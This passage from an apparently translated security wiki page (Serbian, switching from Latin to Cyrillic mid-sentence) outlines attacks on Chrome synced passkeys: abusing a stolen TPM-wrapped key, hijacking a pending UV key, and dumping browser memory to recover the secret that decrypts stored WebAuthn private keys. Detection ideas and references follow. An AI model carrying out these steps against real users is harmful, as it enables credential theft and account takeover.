   - Iskoristite ukradeni blob `wrapped_identity_private_key` na TPM-u žrtve za potpisivanje zahteva za cloud-authenticator binding.
   - Prosledite dobijenu assertion poruku relying party-ju.
   - Ovo je naročito korisno kada RP prihvata `userVerification=preferred` ili ne odbacuje assertion poruke sa **`UV=0`**.
2. **Otmičanje UV ključa na čekanju**<sup>[[4]](#references)</sup>
   - Prisilite ponovno uključivanje brisanjem `passkey_enclave_state` ili slanjem važeće potpisane operacije `device/forget`.
   - Ako uključivanje ostavi uređaj у стању **`uv_key_pending`**, региструјте UV јавни кључ који контролише нападач.
   - Ако провајдер не проверава атестацију / порекло безбедног хардвера за нови UV кључ, каснији потписи нападачевог кључа биће третирани као **`UV=1`**.
3. **Крађа главне тајне / SDS-а током опоравка**<sup>[[4]](#references)</sup>
   - Присилите опоравак или поновно придруживање како би Chrome преузео главну тајну синхронизованих passkey-а.
   - Пратите поновно креирање/измену `passkey_enclave_state`, а затим направите дамп Chrome меморије док се чист текст **тајне безбедносног домена (SDS)** налази у меморији.
   - Искористите опорављени SDS да дешифрујете шифрована поља у сваком запису `WebauthnCredentialSpecifics` и повратите преносиве WebAuthn приватне кључеве.

### DFIR / идеје за детекцију

- Пратите **брисање/поновно креирање** `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Поставите упозорење за ненормалан приступ Chrome-овом **`Sync Data\LevelDB`** из процеса који нису прегледач.
- Поставите упозорење за **дампове Chrome меморије** или сумњив приступ меморији између процеса.
- Истражите поновљене захтеве за **PIN за опоравак Google Password Manager-а** или неочекивано поновно укључивање.
- Имајте у виду да WebAuthn **`signCount`** често није користан за синхронизоване passkey-е, јер може остати непромењен, па је класична детекција клонирања слаба.

## References

- [1] [Unit 42 – Истрага о годинама неоткривених операција усмерених на секторе високе вредности](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: Word VBA макро phishing путем SMTP → дешифровање hMailServer акредитива → Veeam CVE-2023-27532 до SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Унутар Ink Dragon-а: откривање relay мреже и унутрашњег рада прикривене офанзивне операције](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: Нови нападни простор у аутентификацији без лозинке](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / складиштење CNG кључева](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Напади на Microsoft системе и мреже](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Како Active Directory складиште података заиста функционише: унутар NTDS.dit (1. део)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Удаљено извлачење лозинки из Lsass-а](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho проширује свој арсенал сајбер-шпијунаже помоћу алата Still](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – функција CreateFileW и `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – резервни режим Robocopy `/B`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram FAQ – прекидање активних сесија](https://telegram.org/faq)
{{#include ../../banners/hacktricks-training.md}}
